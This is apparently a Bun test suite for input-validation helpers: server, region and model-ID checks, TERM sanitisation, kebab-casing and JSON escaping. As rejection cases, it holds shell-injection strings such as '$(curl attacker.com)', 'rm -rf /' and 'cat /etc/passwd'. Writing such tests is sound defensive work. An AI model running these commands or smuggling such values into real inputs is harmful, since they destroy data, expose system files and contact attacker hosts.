import { describe, expect, it } from "bun:test";

const { validateServerName, validateRegionName, validateModelId, toKebabCase, sanitizeTermValue, jsonEscape } =
  await import("../shared/ui.js");

// ── validateServerName ──────────────────────────────────────────────

describe("validateServerName", () => {
  it("accepts valid names", () => {
    expect(validateServerName("abc")).toBe(true);
    expect(validateServerName("spawn-test-1")).toBe(true);
    expect(validateServerName("my-server-123")).toBe(true);
    expect(validateServerName("a".repeat(63))).toBe(true);
  });

  it("rejects names shorter than 3 chars", () => {
    expect(validateServerName("")).toBe(false);
    expect(validateServerName("a")).toBe(false);
    expect(validateServerName("ab")).toBe(false);
  });

  it("rejects names longer than 63 chars", () => {
    expect(validateServerName("a".repeat(64))).toBe(false);
  });

  it("rejects names with special characters", () => {
    expect(validateServerName("my_server")).toBe(false);
    expect(validateServerName("my server")).toBe(false);
    expect(validateServerName("my.server")).toBe(false);
    expect(validateServerName("my@server")).toBe(false);
  });

  it("rejects names with leading or trailing dashes", () => {
    expect(validateServerName("-abc")).toBe(false);
    expect(validateServerName("abc-")).toBe(false);
    expect(validateServerName("-abc-")).toBe(false);
  });
});

// ── validateRegionName ──────────────────────────────────────────────

describe("validateRegionName", () => {
  it("accepts valid region names", () => {
    expect(validateRegionName("us-east-1")).toBe(true);
    expect(validateRegionName("eu_west_2")).toBe(true);
    expect(validateRegionName("a")).toBe(true);
    expect(validateRegionName("us-east1-b")).toBe(true);
  });

  it("rejects empty string", () => {
    expect(validateRegionName("")).toBe(false);
  });

  it("rejects names longer than 63 chars", () => {
    expect(validateRegionName("a".repeat(64))).toBe(false);
  });

  it("rejects names with invalid characters", () => {
    expect(validateRegionName("us east")).toBe(false);
    expect(validateRegionName("us.east")).toBe(false);
    expect(validateRegionName("us@east")).toBe(false);
  });
});

// ── validateModelId ─────────────────────────────────────────────────

describe("validateModelId", () => {
  it("accepts valid model IDs", () => {
    expect(validateModelId("anthropic/claude-3")).toBe(true);
    expect(validateModelId("openai/gpt-4o")).toBe(true);
    expect(validateModelId("moonshotai/kimi-k2.5")).toBe(true);
    expect(validateModelId("google/gemini-pro")).toBe(true);
    expect(validateModelId("meta-llama/llama-3.1-8b:free")).toBe(true);
  });

  it("rejects empty string", () => {
    expect(validateModelId("")).toBe(false);
  });

  it("rejects model IDs without provider prefix", () => {
    expect(validateModelId("claude-3")).toBe(false);
  });

  it("rejects shell injection attempts", () => {
    expect(validateModelId('"; curl attacker.com; "')).toBe(false);
    expect(validateModelId("$(whoami)")).toBe(false);
    expect(validateModelId("`id`/model")).toBe(false);
    expect(validateModelId("provider/model; rm -rf /")).toBe(false);
    expect(validateModelId("provider/model\ninjection")).toBe(false);
  });

  it("rejects model IDs with spaces", () => {
    expect(validateModelId("provider/model name")).toBe(false);
  });

  it("rejects model IDs starting with non-alphanumeric", () => {
    expect(validateModelId("-provider/model")).toBe(false);
    expect(validateModelId("/model")).toBe(false);
    expect(validateModelId("provider/-model")).toBe(false);
  });
});

// ── toKebabCase ─────────────────────────────────────────────────────

describe("toKebabCase", () => {
  it("converts uppercase to lowercase", () => {
    expect(toKebabCase("MyServer")).toBe("myserver");
  });

  it("replaces spaces with dashes", () => {
    expect(toKebabCase("my server")).toBe("my-server");
  });

  it("replaces special characters with dashes", () => {
    expect(toKebabCase("my.server@cloud")).toBe("my-server-cloud");
  });

  it("collapses consecutive dashes", () => {
    expect(toKebabCase("my--server")).toBe("my-server");
    expect(toKebabCase("a...b")).toBe("a-b");
  });

  it("strips leading and trailing dashes", () => {
    expect(toKebabCase("-hello-")).toBe("hello");
    expect(toKebabCase("  hello  ")).toBe("hello");
  });
});

// ── sanitizeTermValue (security-critical) ───────────────────────────

describe("sanitizeTermValue", () => {
  it("passes through safe TERM values", () => {
    expect(sanitizeTermValue("xterm-256color")).toBe("xterm-256color");
    expect(sanitizeTermValue("screen")).toBe("screen");
    expect(sanitizeTermValue("vt100")).toBe("vt100");
    expect(sanitizeTermValue("tmux-256color")).toBe("tmux-256color");
    expect(sanitizeTermValue("linux")).toBe("linux");
  });

  it("rejects shell injection attempts", () => {
    expect(sanitizeTermValue("$(curl attacker.com)")).toBe("xterm-256color");
    expect(sanitizeTermValue("`whoami`")).toBe("xterm-256color");
    expect(sanitizeTermValue("xterm; rm -rf /")).toBe("xterm-256color");
    expect(sanitizeTermValue("xterm\ninjection")).toBe("xterm-256color");
  });

  it("rejects values with spaces or special chars", () => {
    expect(sanitizeTermValue("xterm 256")).toBe("xterm-256color");
    expect(sanitizeTermValue("term'quote")).toBe("xterm-256color");
    expect(sanitizeTermValue('term"double')).toBe("xterm-256color");
  });

  it("passes through all allowlisted values", () => {
    const allowlisted = [
      "xterm-256color",
      "xterm",
      "screen-256color",
      "screen",
      "tmux-256color",
      "tmux",
      "linux",
      "vt100",
      "vt220",
      "dumb",
    ];
    for (const val of allowlisted) {
      expect(sanitizeTermValue(val)).toBe(val);
    }
  });

  it("rejects pipe, redirect, and variable expansion attacks", () => {
    expect(sanitizeTermValue("xterm|cat /etc/passwd")).toBe("xterm-256color");
    expect(sanitizeTermValue("xterm>>/tmp/evil")).toBe("xterm-256color");
    expect(sanitizeTermValue("${PATH}")).toBe("xterm-256color");
    expect(sanitizeTermValue("$HOME")).toBe("xterm-256color");
    expect(sanitizeTermValue("xterm&&curl attacker.com")).toBe("xterm-256color");
    expect(sanitizeTermValue("xterm||true")).toBe("xterm-256color");
  });

  it("rejects empty and whitespace-only strings", () => {
    expect(sanitizeTermValue("")).toBe("xterm-256color");
    expect(sanitizeTermValue(" ")).toBe("xterm-256color");
    expect(sanitizeTermValue("\t")).toBe("xterm-256color");
  });
});

// ── jsonEscape ──────────────────────────────────────────────────────

describe("jsonEscape", () => {
  it("wraps simple strings in quotes", () => {
    expect(jsonEscape("hello")).toBe('"hello"');
  });

  it("escapes double quotes", () => {
    expect(jsonEscape('say "hi"')).toBe('"say \\"hi\\""');
  });

  it("escapes newlines and tabs", () => {
    expect(jsonEscape("line1\nline2")).toBe('"line1\\nline2"');
    expect(jsonEscape("col1\tcol2")).toBe('"col1\\tcol2"');
  });

  it("escapes backslashes", () => {
    expect(jsonEscape("path\\to\\file")).toBe('"path\\\\to\\\\file"');
  });
});
